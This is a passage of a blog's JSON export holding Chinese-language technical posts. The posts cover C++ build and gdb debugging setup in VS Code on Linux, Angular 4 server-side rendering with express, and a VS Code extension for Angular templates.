\\\"name\\\": \\\"(gdb) Launch\\\",\\n            \\\"type\\\": \\\"cppdbg\\\",\\n            \\\"request\\\": \\\"launch\\\",\\n            \\\"program\\\": \\\"${workspaceRoot}/main\\\", //make编译出的可执行文件\\n            \\\"args\\\": [],\\n            \\\"stopAtEntry\\\": true,\\n            \\\"cwd\\\": \\\"${workspaceRoot}\\\",\\n            \\\"environment\\\": [],\\n            \\\"externalConsole\\\": true,\\n            \\\"preLaunchTask\\\": \\\"build\\\",\\n            \\\"linux\\\": {\\n                \\\"MIMode\\\": \\\"gdb\\\",\\n                \\\"miDebuggerPath\\\": \\\"/usr/bin/gdb\\\"\\n            },\\n            \\\"osx\\\": {\\n                \\\"MIMode\\\": \\\"lldb\\\"\\n            },\\n            \\\"windows\\\": {\\n                \\\"MIMode\\\": \\\"gdb\\\"\\n            }\\n        }\\n    ]\\n}\\n//tasks.json\\n{\\n    \\\"version\\\": \\\"2.0.0\\\",\\n    \\\"command\\\": \\\"make\\\",\\n    \\\"showOutput\\\": \\\"always\\\",\\n    \\\"tasks\\\": [\\n        {\\n            \\\"taskName\\\": \\\"clean\\\"\\n        },\\n        {\\n            \\\"taskName\\\": \\\"build\\\",\\n            \\\"problemMatcher\\\": {\\n                \\\"owner\\\": \\\"cpp\\\",\\n                \\\"fileLocation\\\":  [\\\"relative\\\", \\\"${workspaceRoot}\\\"],\\n                \\\"pattern\\\": {\\n                    \\\"regexp\\\": \\\"^(.*):(\\\\\\\\d+):(\\\\\\\\d+):\\\\\\\\s+(warning|error):\\\\\\\\s+(.*)$\\\",\\n                    \\\"file\\\": 1,\\n                    \\\"line\\\": 2,\\n                    \\\"column\\\": 3,\\n                    \\\"severity\\\": 4,\\n                    \\\"message\\\": 5\\n                }\\n            }\\n        }\\n    ]\\n}\\n</pre>\\n\\n有时还会提示这个错误`No terminal is available to launch the debugger. Please install Gnome Terminal or XTerm`没必要安装XTerm命令行，只需把自带的命令行软连接就行，`sudo ln -s ./deepin-terminal xterm`\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h3 id=\"gbuildessential\">先安装编译工具。g++,build-essential。</h3>\n<p>错误实例 g++: error trying to exec 'cc1plus': execvp: 没有那个文件或目录,这时因为缺少g++，或者gcc和g++版本不一致。</p>\n<pre><code>sudo apt-get install build-essential\nsudo apt-get install g++\n</code></pre>\n<h3 id=\"vscodevscodecpptools\">vscode安装vscode-cpptools插件</h3>\n<p>它带了很多的功能，如clang格式化代码，利用gdb断点调试。如果提示miDebuggerPath没找到，则安装gdb<code>sudo apt-get install gdb</code></p>\n<h3 id=\"makefile\">makefile</h3>\n<p>makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率。make是一个命令工具，是一个解释makefile中指令的命令工具。<br>\n实例如下：</p>\n<pre><code>build : 1.o\n\tg++ -o main 1.o\n1.o : 1.cpp \n\tg++ -g -c 1.cpp\nclean :\n\trm 1.o main\n</code></pre>\n<pre class=\"code\" data-lang=\"json\">\n///launch.json\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"(gdb) Launch\",\n            \"type\": \"cppdbg\",\n            \"request\": \"launch\",\n            \"program\": \"${workspaceRoot}/main\", //make编译出的可执行文件\n            \"args\": [],\n            \"stopAtEntry\": true,\n            \"cwd\": \"${workspaceRoot}\",\n            \"environment\": [],\n            \"externalConsole\": true,\n            \"preLaunchTask\": \"build\",\n            \"linux\": {\n                \"MIMode\": \"gdb\",\n                \"miDebuggerPath\": \"/usr/bin/gdb\"\n            },\n            \"osx\": {\n                \"MIMode\": \"lldb\"\n            },\n            \"windows\": {\n                \"MIMode\": \"gdb\"\n            }\n        }\n    ]\n}\n//tasks.json\n{\n    \"version\": \"2.0.0\",\n    \"command\": \"make\",\n    \"showOutput\": \"always\",\n    \"tasks\": [\n        {\n            \"taskName\": \"clean\"\n        },\n        {\n            \"taskName\": \"build\",\n            \"problemMatcher\": {\n                \"owner\": \"cpp\",\n                \"fileLocation\":  [\"relative\", \"${workspaceRoot}\"],\n                \"pattern\": {\n                    \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n                    \"file\": 1,\n                    \"line\": 2,\n                    \"column\": 3,\n                    \"severity\": 4,\n                    \"message\": 5\n                }\n            }\n        }\n    ]\n}\n</pre>\n<p>有时还会提示这个错误<code>No terminal is available to launch the debugger. Please install Gnome Terminal or XTerm</code>没必要安装XTerm命令行，只需把自带的命令行软连接就行，<code>sudo ln -s ./deepin-terminal xterm</code></p>\n<!--kg-card-end: markdown-->","comment_id":"123","plaintext":"先安装编译工具。g++,build-essential。\n错误实例 g++: error trying to exec 'cc1plus': execvp:\n没有那个文件或目录,这时因为缺少g++，或者gcc和g++版本不一致。\n\nsudo apt-get install build-essential\nsudo apt-get install g++\n\n\nvscode安装vscode-cpptools插件\n它带了很多的功能，如clang格式化代码，利用gdb断点调试。如果提示miDebuggerPath没找到，则安装gdbsudo apt-get install\ngdb\n\nmakefile\nmakefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率。make是一个命令工具，是一个解释makefile中指令的命令工具。\n实例如下：\n\nbuild : 1.o\n\tg++ -o main 1.o\n1.o : 1.cpp \n\tg++ -g -c 1.cpp\nclean :\n\trm 1.o main\n\n\n\n///launch.json\n{\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"(gdb) Launch\",\n            \"type\": \"cppdbg\",\n            \"request\": \"launch\",\n            \"program\": \"${workspaceRoot}/main\", //make编译出的可执行文件\n            \"args\": [],\n            \"stopAtEntry\": true,\n            \"cwd\": \"${workspaceRoot}\",\n            \"environment\": [],\n            \"externalConsole\": true,\n            \"preLaunchTask\": \"build\",\n            \"linux\": {\n                \"MIMode\": \"gdb\",\n                \"miDebuggerPath\": \"/usr/bin/gdb\"\n            },\n            \"osx\": {\n                \"MIMode\": \"lldb\"\n            },\n            \"windows\": {\n                \"MIMode\": \"gdb\"\n            }\n        }\n    ]\n}\n//tasks.json\n{\n    \"version\": \"2.0.0\",\n    \"command\": \"make\",\n    \"showOutput\": \"always\",\n    \"tasks\": [\n        {\n            \"taskName\": \"clean\"\n        },\n        {\n            \"taskName\": \"build\",\n            \"problemMatcher\": {\n                \"owner\": \"cpp\",\n                \"fileLocation\":  [\"relative\", \"${workspaceRoot}\"],\n                \"pattern\": {\n                    \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n                    \"file\": 1,\n                    \"line\": 2,\n                    \"column\": 3,\n                    \"severity\": 4,\n                    \"message\": 5\n                }\n            }\n        }\n    ]\n}\n\n\n有时还会提示这个错误No terminal is available to launch the debugger. Please install Gnome\nTerminal or XTerm没必要安装XTerm命令行，只需把自带的命令行软连接就行，sudo ln -s ./deepin-terminal xterm","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-08-29T02:46:08.000Z","created_by":"1","updated_at":"2017-08-29T06:51:45.000Z","updated_by":"1","published_at":"2017-08-29T05:25:40.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d338","uuid":"0e330249-9221-4c65-8c50-d4431fd2da6a","title":"Angular服务器渲染","slug":"untitled-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"##  一、前言\\n\\n​\\t为什么需要服务端渲染？当我们要求**渲染时间尽量快、页面响应速度快**时（优点），才会采用服务器渲染，并且应该“按需”对页面进行渲染 ——“首次加载/首屏”。即服务端渲染的优势在于：由中间层( nodejs端 )为客户端**请求初始数据、渲染好页面** ，有利于SEO优化。\\n\\n## 二、实现\\n\\nAngular2.x有个服务器渲染 `Angular2-Universal` ，但是在`Angular4` 中部分是合并到`@angular/platform-server`。使用也大大不同了，这里主要讲Angular4，如何使用服务器渲染。\\n\\n>  #### 1.新建一个Angular新项目\\n\\n`ng new Server-Render`，这是localhost:4200返回的。没有经过服务器渲染，`<body>`只有`<app-root></app-root>`标签。\\n\\n```html\\n<!doctype html>\\n<html lang=\\\"en\\\">\\n<head>\\n  <meta charset=\\\"utf-8\\\">\\n  <title>ServerRender</title>\\n  <base href=\\\"/\\\">\\n\\n  <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1\\\">\\n  <link rel=\\\"icon\\\" type=\\\"image/x-icon\\\" href=\\\"favicon.ico\\\">\\n</head>\\n<body>\\n  <app-root></app-root>\\n<script type=\\\"text/javascript\\\" src=\\\"inline.bundle.js\\\"></script><script type=\\\"text/javascript\\\" src=\\\"polyfills.bundle.js\\\"></script><script type=\\\"text/javascript\\\" src=\\\"styles.bundle.js\\\"></script><script type=\\\"text/javascript\\\" src=\\\"vendor.bundle.js\\\"></script><script type=\\\"text/javascript\\\" src=\\\"main.bundle.js\\\"></script></body>\\n</html>\\n```\\n\\n\\n\\n> #### 2.增加`browser-app.module.ts`、`server-app.module.ts`\\n\\n增加两个文件`browser-app.module.ts`、`server-app.module.ts`一个是node渲染的Module，还有一个浏览器渲染的Module。\\n\\n```typescript\\n//browser-app.module.ts\\nimport { NgModule } from '@angular/core';\\nimport { BrowserModule } from '@angular/platform-browser';\\nimport { AppComponent } from './app.component';\\nimport { AppModule } from './app.module';\\n\\n@NgModule({\\n  bootstrap: [ AppComponent ],\\n  imports: [\\n    BrowserModule.withServerTransition({\\n      appId: 'my-app-id' \\n    }),\\n    AppModule\\n  ]\\n})\\nexport class BrowserAppModule {}\\n\\n```\\n\\n```typescript\\n//server-app.module.ts\\nimport { NgModule, APP_BOOTSTRAP_LISTENER, ApplicationRef } from '@angular/core';\\nimport { ServerModule } from '@angular/platform-server';\\nimport { AppComponent } from './app.component';\\nimport { AppModule } from './app.module';\\nimport { BrowserModule } from '@angular/platform-browser';\\n\\n@NgModule({\\n  bootstrap: [AppComponent],\\n  imports: [\\n    BrowserModule.withServerTransition({\\n      appId: 'my-app-id' //必须和browser-app.module.ts中的一样\\n    }),\\n    ServerModule,\\n    AppModule\\n  ]\\n})\\nexport class ServerAppModule {\\n\\n}\\n```\\n\\n\\n\\n> #### 3.入口修改\\n\\nAngular默认是用`@angular/platform-browser-dynamic`加载，只需要一个入口。而服务器渲染有两个入口，`main.server.ts`、`main.browser.ts`，一个是node运行的入口，一个是浏览器运行的入口。\\n\\n* main.browser.ts\\n\\n用于加载`BrowserAppModule`，生成浏览器运行的js代码。\\n\\n```typescript\\nexport function main() {\\n  return platformBrowserDynamic().bootstrapModule(BrowserAppModule);\\n}\\n//需要因为服务器渲染已经渲染好html，需要等待dom加载完成，绑定事件。\\ndocument.addEventListener('DOMContentLoaded', main, false);\\n```\\n\\n* main.server.ts\\n\\n在服务器上面渲染js代码，加载`ServerAppModule`。这里使用`express`作为web服务器。使用html作为模板，更改`@nguniversal/express-engine`为模板引擎。这里把Angular路由注册成`express`路由，第一次加载都会经过服务器渲染，其他时候使用`history API`模拟跳转。\\n\\n```typescript\\nimport 'zone.js/dist/zone-node';//使用zone的node版\\nimport 'reflect-metadata';\\nimport 'rxjs/Rx';\\nimport * as express from 'express';\\nimport { Request, Response } from 'express';\\nimport { platformServer, renderModuleFactory } from '@angular/platform-server';\\nimport { ServerAppModule } from './app/server-app.module';\\nimport { ngExpressEngine } from '@nguniversal/express-engine';\\nimport { routers } from './app/router'\\nimport { enableProdMode } from '@angular/core';\\nenableProdMode();\\nconst app = express();\\nconst port = 8000;\\nconst baseUrl = `http://localhost:${port}`;\\n\\napp.engine('html', ngExpressEngine({\\n  bootstrap: ServerAppModule\\n}));\\n\\napp.set('view engine', 'html');\\napp.set('views', 'src');\\n\\napp.use('/', express.static('dist', { index: false }));\\n\\nrouters.forEach((route: any) => {\\n  app.get('/'+route.path, (req: Request, res: Response) => {\\n    console.time(`GET: ${req.originalUrl}`);\\n    res.render('../dist/index', {\\n      req: req,\\n      res: res\\n    });\\n    console.timeEnd(`GET: ${req.originalUrl}`);\\n  });\\n});\\n\\napp.listen(port, () => {\\n  console.log(`Listening at ${baseUrl}`);\\n});\\n```\\n\\n`@nguniversal/express-engine`是一个nodejs渲染Angular应用程序渲染引擎，它加载初始的html文件渲染出DOM结构，返回给浏览器。[高级用法](https://github.com/angular/universal/tree/master/modules/ng-express-engine)。比如，在渲染的时候接收到`request`参数，直接渲染到html中。如下：\\n```typescript\\nimport { Request } from 'express';\\nimport { REQUEST } from '@nguniversal/express-engine/tokens';\\n \\n@Injectable()\\nexport class RequestService {\\n  constructor(@Inject(REQUEST) private request: Request) {}\\n}\\n```\\n\\n\\n## 三、服务器渲染陷阱\\n\\n* **`window`**, **`document`**, **`navigator`**, 等浏览器属性是不存在nodejs中的。因此涉及到dom结构的库如（jQuery）都不能工作。\\n\\n因此你在项目中使用的时候，需要注意到当前运行在什么环境，如下：\\n\\n```typescript\\n import { PLATFORM_ID } from '@angular/core';\\n import { isPlatformBrowser, isPlatformServer } from '@angular/common';\\n \\n constructor(@Inject(PLATFORM_ID) private platformId: Object) { ... }\\n \\n ngOnInit() {\\n   if (isPlatformBrowser(this.platformId)) {\\n      // Client only code.\\n      ...\\n   }\\n   if (isPlatformServer(this.platformId)) {\\n     // Server only code.\\n     ...\\n   }\\n }\\n```\\n\\n* 尽量少使用或避免避免`setTimeout`，它将等所有的`setTimeout`结束并渲染完，才会`response`。\\n\\n* 记得关闭Rxjs的流。\\n\\n* 服务器渲染时不能直接操作`nativeElement`。\\n\\n  ```typescript\\n  constructor(element: ElementRef, renderer: Renderer2) {\\n    renderer.setStyle(element.nativeElement, 'font-size', 'x-large');\\n  }\\n  ```\\n\\n* 在服务器渲染的时候发送了`XHR`请求，渲染出带数据的`HTML`，在浏览器中又会发送`XHR`请求，这次是多余的。可以使用缓存，把服务器端的数据通过生成`<scrirpt>`标签传递给浏览器，浏览器使用缓存即可。[官方示例](https://github.com/angular/universal-starter)。\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><h2 id=\"\">一、前言</h2>\n<p>​\t为什么需要服务端渲染？当我们要求<strong>渲染时间尽量快、页面响应速度快</strong>时（优点），才会采用服务器渲染，并且应该“按需”对页面进行渲染 ——“首次加载/首屏”。即服务端渲染的优势在于：由中间层( nodejs端 )为客户端<strong>请求初始数据、渲染好页面</strong> ，有利于SEO优化。</p>\n<h2 id=\"\">二、实现</h2>\n<p>Angular2.x有个服务器渲染 <code>Angular2-Universal</code> ，但是在<code>Angular4</code> 中部分是合并到<code>@angular/platform-server</code>。使用也大大不同了，这里主要讲Angular4，如何使用服务器渲染。</p>\n<blockquote>\n<h4 id=\"1angular\">1.新建一个Angular新项目</h4>\n</blockquote>\n<p><code>ng new Server-Render</code>，这是localhost:4200返回的。没有经过服务器渲染，<code>&lt;body&gt;</code>只有<code>&lt;app-root&gt;&lt;/app-root&gt;</code>标签。</p>\n<pre><code class=\"language-html\">&lt;!doctype html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n  &lt;meta charset=&quot;utf-8&quot;&gt;\n  &lt;title&gt;ServerRender&lt;/title&gt;\n  &lt;base href=&quot;/&quot;&gt;\n\n  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;\n  &lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;favicon.ico&quot;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;app-root&gt;&lt;/app-root&gt;\n&lt;script type=&quot;text/javascript&quot; src=&quot;inline.bundle.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;polyfills.bundle.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;styles.bundle.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;vendor.bundle.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;main.bundle.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<blockquote>\n<h4 id=\"2browserappmoduletsserverappmodulets\">2.增加<code>browser-app.module.ts</code>、<code>server-app.module.ts</code></h4>\n</blockquote>\n<p>增加两个文件<code>browser-app.module.ts</code>、<code>server-app.module.ts</code>一个是node渲染的Module，还有一个浏览器渲染的Module。</p>\n<pre><code class=\"language-typescript\">//browser-app.module.ts\nimport { NgModule } from '@angular/core';\nimport { BrowserModule } from '@angular/platform-browser';\nimport { AppComponent } from './app.component';\nimport { AppModule } from './app.module';\n\n@NgModule({\n  bootstrap: [ AppComponent ],\n  imports: [\n    BrowserModule.withServerTransition({\n      appId: 'my-app-id' \n    }),\n    AppModule\n  ]\n})\nexport class BrowserAppModule {}\n\n</code></pre>\n<pre><code class=\"language-typescript\">//server-app.module.ts\nimport { NgModule, APP_BOOTSTRAP_LISTENER, ApplicationRef } from '@angular/core';\nimport { ServerModule } from '@angular/platform-server';\nimport { AppComponent } from './app.component';\nimport { AppModule } from './app.module';\nimport { BrowserModule } from '@angular/platform-browser';\n\n@NgModule({\n  bootstrap: [AppComponent],\n  imports: [\n    BrowserModule.withServerTransition({\n      appId: 'my-app-id' //必须和browser-app.module.ts中的一样\n    }),\n    ServerModule,\n    AppModule\n  ]\n})\nexport class ServerAppModule {\n\n}\n</code></pre>\n<blockquote>\n<h4 id=\"3\">3.入口修改</h4>\n</blockquote>\n<p>Angular默认是用<code>@angular/platform-browser-dynamic</code>加载，只需要一个入口。而服务器渲染有两个入口，<code>main.server.ts</code>、<code>main.browser.ts</code>，一个是node运行的入口，一个是浏览器运行的入口。</p>\n<ul>\n<li>main.browser.ts</li>\n</ul>\n<p>用于加载<code>BrowserAppModule</code>，生成浏览器运行的js代码。</p>\n<pre><code class=\"language-typescript\">export function main() {\n  return platformBrowserDynamic().bootstrapModule(BrowserAppModule);\n}\n//需要因为服务器渲染已经渲染好html，需要等待dom加载完成，绑定事件。\ndocument.addEventListener('DOMContentLoaded', main, false);\n</code></pre>\n<ul>\n<li>main.server.ts</li>\n</ul>\n<p>在服务器上面渲染js代码，加载<code>ServerAppModule</code>。这里使用<code>express</code>作为web服务器。使用html作为模板，更改<code>@nguniversal/express-engine</code>为模板引擎。这里把Angular路由注册成<code>express</code>路由，第一次加载都会经过服务器渲染，其他时候使用<code>history API</code>模拟跳转。</p>\n<pre><code class=\"language-typescript\">import 'zone.js/dist/zone-node';//使用zone的node版\nimport 'reflect-metadata';\nimport 'rxjs/Rx';\nimport * as express from 'express';\nimport { Request, Response } from 'express';\nimport { platformServer, renderModuleFactory } from '@angular/platform-server';\nimport { ServerAppModule } from './app/server-app.module';\nimport { ngExpressEngine } from '@nguniversal/express-engine';\nimport { routers } from './app/router'\nimport { enableProdMode } from '@angular/core';\nenableProdMode();\nconst app = express();\nconst port = 8000;\nconst baseUrl = `http://localhost:${port}`;\n\napp.engine('html', ngExpressEngine({\n  bootstrap: ServerAppModule\n}));\n\napp.set('view engine', 'html');\napp.set('views', 'src');\n\napp.use('/', express.static('dist', { index: false }));\n\nrouters.forEach((route: any) =&gt; {\n  app.get('/'+route.path, (req: Request, res: Response) =&gt; {\n    console.time(`GET: ${req.originalUrl}`);\n    res.render('../dist/index', {\n      req: req,\n      res: res\n    });\n    console.timeEnd(`GET: ${req.originalUrl}`);\n  });\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Listening at ${baseUrl}`);\n});\n</code></pre>\n<p><code>@nguniversal/express-engine</code>是一个nodejs渲染Angular应用程序渲染引擎，它加载初始的html文件渲染出DOM结构，返回给浏览器。<a href=\"https://github.com/angular/universal/tree/master/modules/ng-express-engine\">高级用法</a>。比如，在渲染的时候接收到<code>request</code>参数，直接渲染到html中。如下：</p>\n<pre><code class=\"language-typescript\">import { Request } from 'express';\nimport { REQUEST } from '@nguniversal/express-engine/tokens';\n \n@Injectable()\nexport class RequestService {\n  constructor(@Inject(REQUEST) private request: Request) {}\n}\n</code></pre>\n<h2 id=\"\">三、服务器渲染陷阱</h2>\n<ul>\n<li><strong><code>window</code></strong>, <strong><code>document</code></strong>, <strong><code>navigator</code></strong>, 等浏览器属性是不存在nodejs中的。因此涉及到dom结构的库如（jQuery）都不能工作。</li>\n</ul>\n<p>因此你在项目中使用的时候，需要注意到当前运行在什么环境，如下：</p>\n<pre><code class=\"language-typescript\"> import { PLATFORM_ID } from '@angular/core';\n import { isPlatformBrowser, isPlatformServer } from '@angular/common';\n \n constructor(@Inject(PLATFORM_ID) private platformId: Object) { ... }\n \n ngOnInit() {\n   if (isPlatformBrowser(this.platformId)) {\n      // Client only code.\n      ...\n   }\n   if (isPlatformServer(this.platformId)) {\n     // Server only code.\n     ...\n   }\n }\n</code></pre>\n<ul>\n<li>\n<p>尽量少使用或避免避免<code>setTimeout</code>，它将等所有的<code>setTimeout</code>结束并渲染完，才会<code>response</code>。</p>\n</li>\n<li>\n<p>记得关闭Rxjs的流。</p>\n</li>\n<li>\n<p>服务器渲染时不能直接操作<code>nativeElement</code>。</p>\n<pre><code class=\"language-typescript\">constructor(element: ElementRef, renderer: Renderer2) {\n  renderer.setStyle(element.nativeElement, 'font-size', 'x-large');\n}\n</code></pre>\n</li>\n<li>\n<p>在服务器渲染的时候发送了<code>XHR</code>请求，渲染出带数据的<code>HTML</code>，在浏览器中又会发送<code>XHR</code>请求，这次是多余的。可以使用缓存，把服务器端的数据通过生成<code>&lt;scrirpt&gt;</code>标签传递给浏览器，浏览器使用缓存即可。<a href=\"https://github.com/angular/universal-starter\">官方示例</a>。</p>\n</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"124","plaintext":"一、前言\n​\t为什么需要服务端渲染？当我们要求渲染时间尽量快、页面响应速度快时（优点），才会采用服务器渲染，并且应该“按需”对页面进行渲染\n——“首次加载/首屏”。即服务端渲染的优势在于：由中间层( nodejs端 )为客户端请求初始数据、渲染好页面 ，有利于SEO优化。\n\n二、实现\nAngular2.x有个服务器渲染 Angular2-Universal ，但是在Angular4 中部分是合并到\n@angular/platform-server。使用也大大不同了，这里主要讲Angular4，如何使用服务器渲染。\n\n> 1.新建一个Angular新项目\n\nng new Server-Render，这是localhost:4200返回的。没有经过服务器渲染，<body>只有<app-root></app-root>\n标签。\n\n<!doctype html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"utf-8\">\n  <title>ServerRender</title>\n  <base href=\"/\">\n\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n  <link rel=\"icon\" type=\"image/x-icon\" href=\"favicon.ico\">\n</head>\n<body>\n  <app-root></app-root>\n<script type=\"text/javascript\" src=\"inline.bundle.js\"></script><script type=\"text/javascript\" src=\"polyfills.bundle.js\"></script><script type=\"text/javascript\" src=\"styles.bundle.js\"></script><script type=\"text/javascript\" src=\"vendor.bundle.js\"></script><script type=\"text/javascript\" src=\"main.bundle.js\"></script></body>\n</html>\n\n\n> 2.增加browser-app.module.ts、server-app.module.ts\n\n增加两个文件browser-app.module.ts、server-app.module.ts\n一个是node渲染的Module，还有一个浏览器渲染的Module。\n\n//browser-app.module.ts\nimport { NgModule } from '@angular/core';\nimport { BrowserModule } from '@angular/platform-browser';\nimport { AppComponent } from './app.component';\nimport { AppModule } from './app.module';\n\n@NgModule({\n  bootstrap: [ AppComponent ],\n  imports: [\n    BrowserModule.withServerTransition({\n      appId: 'my-app-id' \n    }),\n    AppModule\n  ]\n})\nexport class BrowserAppModule {}\n\n\n\n//server-app.module.ts\nimport { NgModule, APP_BOOTSTRAP_LISTENER, ApplicationRef } from '@angular/core';\nimport { ServerModule } from '@angular/platform-server';\nimport { AppComponent } from './app.component';\nimport { AppModule } from './app.module';\nimport { BrowserModule } from '@angular/platform-browser';\n\n@NgModule({\n  bootstrap: [AppComponent],\n  imports: [\n    BrowserModule.withServerTransition({\n      appId: 'my-app-id' //必须和browser-app.module.ts中的一样\n    }),\n    ServerModule,\n    AppModule\n  ]\n})\nexport class ServerAppModule {\n\n}\n\n\n> 3.入口修改\n\nAngular默认是用@angular/platform-browser-dynamic加载，只需要一个入口。而服务器渲染有两个入口，\nmain.server.ts、main.browser.ts，一个是node运行的入口，一个是浏览器运行的入口。\n\n * main.browser.ts\n\n用于加载BrowserAppModule，生成浏览器运行的js代码。\n\nexport function main() {\n  return platformBrowserDynamic().bootstrapModule(BrowserAppModule);\n}\n//需要因为服务器渲染已经渲染好html，需要等待dom加载完成，绑定事件。\ndocument.addEventListener('DOMContentLoaded', main, false);\n\n\n * main.server.ts\n\n在服务器上面渲染js代码，加载ServerAppModule。这里使用express作为web服务器。使用html作为模板，更改\n@nguniversal/express-engine为模板引擎。这里把Angular路由注册成express路由，第一次加载都会经过服务器渲染，其他时候使用\nhistory API模拟跳转。\n\nimport 'zone.js/dist/zone-node';//使用zone的node版\nimport 'reflect-metadata';\nimport 'rxjs/Rx';\nimport * as express from 'express';\nimport { Request, Response } from 'express';\nimport { platformServer, renderModuleFactory } from '@angular/platform-server';\nimport { ServerAppModule } from './app/server-app.module';\nimport { ngExpressEngine } from '@nguniversal/express-engine';\nimport { routers } from './app/router'\nimport { enableProdMode } from '@angular/core';\nenableProdMode();\nconst app = express();\nconst port = 8000;\nconst baseUrl = `http://localhost:${port}`;\n\napp.engine('html', ngExpressEngine({\n  bootstrap: ServerAppModule\n}));\n\napp.set('view engine', 'html');\napp.set('views', 'src');\n\napp.use('/', express.static('dist', { index: false }));\n\nrouters.forEach((route: any) => {\n  app.get('/'+route.path, (req: Request, res: Response) => {\n    console.time(`GET: ${req.originalUrl}`);\n    res.render('../dist/index', {\n      req: req,\n      res: res\n    });\n    console.timeEnd(`GET: ${req.originalUrl}`);\n  });\n});\n\napp.listen(port, () => {\n  console.log(`Listening at ${baseUrl}`);\n});\n\n\n@nguniversal/express-engine\n是一个nodejs渲染Angular应用程序渲染引擎，它加载初始的html文件渲染出DOM结构，返回给浏览器。高级用法\n[https://github.com/angular/universal/tree/master/modules/ng-express-engine]\n。比如，在渲染的时候接收到request参数，直接渲染到html中。如下：\n\nimport { Request } from 'express';\nimport { REQUEST } from '@nguniversal/express-engine/tokens';\n \n@Injectable()\nexport class RequestService {\n  constructor(@Inject(REQUEST) private request: Request) {}\n}\n\n\n三、服务器渲染陷阱\n * window, document, navigator, 等浏览器属性是不存在nodejs中的。因此涉及到dom结构的库如（jQuery）都不能工作。\n\n因此你在项目中使用的时候，需要注意到当前运行在什么环境，如下：\n\n import { PLATFORM_ID } from '@angular/core';\n import { isPlatformBrowser, isPlatformServer } from '@angular/common';\n \n constructor(@Inject(PLATFORM_ID) private platformId: Object) { ... }\n \n ngOnInit() {\n   if (isPlatformBrowser(this.platformId)) {\n      // Client only code.\n      ...\n   }\n   if (isPlatformServer(this.platformId)) {\n     // Server only code.\n     ...\n   }\n }\n\n\n * 尽量少使用或避免避免setTimeout，它将等所有的setTimeout结束并渲染完，才会response。\n   \n   \n * 记得关闭Rxjs的流。\n   \n   \n * 服务器渲染时不能直接操作nativeElement。\n   \n   constructor(element: ElementRef, renderer: Renderer2) {\n     renderer.setStyle(element.nativeElement, 'font-size', 'x-large');\n   }\n   \n   \n   \n * 在服务器渲染的时候发送了XHR请求，渲染出带数据的HTML，在浏览器中又会发送XHR请求，这次是多余的。可以使用缓存，把服务器端的数据通过生成\n   <scrirpt>标签传递给浏览器，浏览器使用缓存即可。官方示例\n   [https://github.com/angular/universal-starter]。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-09-05T11:03:11.000Z","created_by":"1","updated_at":"2017-09-06T06:23:54.000Z","updated_by":"1","published_at":"2017-09-05T11:03:51.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d339","uuid":"aa4663b5-db1f-4a37-a80d-7d1c9cf123e0","title":"vscode-extension-ngx","slug":"untitled-3","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"写了一个vscode插件。添加html语法，对angular模板语法的支持。平时写angular模板就是html。实在太渣了，跟写jsx没法比。打算写一个插件，正在完善中，高亮和提示angular模板语法。\\n如下：\\n![vscode-extension-ngx](https://raw.githubusercontent.com/laopo001/vscode-extension-ngx/master/demo/demo.gif)\\n\\n> github\\n\\n[vscode-extension-ngx](https://github.com/laopo001/vscode-extension-ngx)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>写了一个vscode插件。添加html语法，对angular模板语法的支持。平时写angular模板就是html。实在太渣了，跟写jsx没法比。打算写一个插件，正在完善中，高亮和提示angular模板语法。<br>\n如下：<br>\n<img src=\"https://raw.githubusercontent.com/laopo001/vscode-extension-ngx/master/demo/demo.gif\" alt=\"vscode-extension-ngx\"></p>\n<blockquote>\n<p>github</p>\n</blockquote>\n<p><a href=\"https://github.com/laopo001/vscode-extension-ngx\">vscode-extension-ngx</a></p>\n<!--kg-card-end: markdown-->","comment_id":"125","plaintext":"写了一个vscode插件。添加html语法，对angular模板语法的支持。平时写angular模板就是html。实在太渣了，跟写jsx没法比。打算写一个插件，正在完善中，高亮和提示angular模板语法。\n如下：\n\n\n> github\n\n\nvscode-extension-ngx 